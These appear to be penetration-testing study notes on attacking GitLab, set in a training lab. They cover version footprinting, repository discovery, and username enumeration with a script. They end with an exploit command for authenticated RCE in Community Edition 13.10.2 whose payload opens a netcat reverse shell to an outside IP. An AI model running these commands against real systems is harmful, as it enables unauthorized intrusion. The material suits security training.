### Footprinting + Enumeration
![[Pasted image 20250210063304.png]]
#### Footprinting Version
The only way to footprint the **GitLab version number** in use is by browsing to the `/help` page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821).

#### Public Repositories
We can discover public repositories by visiting `/explore` on the instance. From here, we can explore each of the pages linked in the top left `groups`, `snippets`, and `help`. We can also use the search functionality and see if we can uncover any other projects.
![[Pasted image 20250210063555.png]]
#### Registering a new user
Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data.
![[Pasted image 20250210064003.png]]

In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this [blog post](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.

### Exploitation
#### Username Enumeration
Though not considered a vulnerability by GitLab as seen on their [Hackerone](https://hackerone.com/gitlab?type=team) page ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"), it is still something worth checking as it could result in access if users are selecting weak passwords

We can use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum).
```bash
python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --wordlist ~/opt/wordlists/usernames_small.txt
```
- /usr/share/seclists/Usernames/cirt-default-usernames.txt
- 

#### Known Vulnerabilities
There have been a few serious exploits against GitLab [12.9.0](https://www.exploit-db.com/exploits/48431) and GitLab [11.4.7](https://www.exploit-db.com/exploits/49257) in the past few years as well as GitLab Community Edition [13.10.3](https://www.exploit-db.com/exploits/49821), [13.9.3](https://www.exploit-db.com/exploits/49944), and [13.10.2](https://www.exploit-db.com/exploits/49951).

###### Authenticated RCE
Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u adot -p 'Pwned123!' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.155 4443 >/tmp/f '
```